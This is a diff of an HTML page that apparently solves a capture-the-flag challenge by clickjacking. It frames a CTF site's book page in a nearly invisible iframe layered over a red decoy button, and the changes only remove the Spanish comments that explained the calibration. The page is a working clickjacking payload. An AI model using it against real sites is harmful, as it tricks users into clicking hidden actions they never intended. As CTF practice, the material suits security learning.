@@ -5,30 +5,30 @@
     <style>
         body { margin: 0; padding: 0; }
 
-        /* Capa de la Víctima (Invisible pero ARRIBA) */
+        
         iframe {
             position: absolute;
             top: 0;
             left: 0;
-            width: 1000px; /* Ancho fijo para consistencia */
+            width: 1000px; 
             height: 1200px;
-            opacity: 0.05; /* Casi invisible, súbelo a 0.5 para calibrar */
-            z-index: 999;  /* Encima para recibir el clic real */
+            opacity: 0.05; 
+            z-index: 999;  
             border: none;
         }
 
-        /* Capa del Atacante (Donde el bot busca el ID) */
+        
         #objetivo {
             position: absolute;
-            /* COORDENADAS: Ajusta según tu pantalla FHD */
+            
             top: 910px;    
             left: 50px;
             
             width: 800px;
             height: 60px;
-            z-index: 1;    /* Debajo del iframe */
+            z-index: 1;   
             
-            background: red; /* Cámbialo a transparent al final */
+            background: red; 
             border: none;
             cursor: pointer;
         }
@@ -40,7 +40,7 @@
     <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
 
     <script>
-        // Forzamos el scroll al cargar para que el iframe esté en la posición correcta
+       
         window.scrollTo(0, 0);
     </script>
 </body>
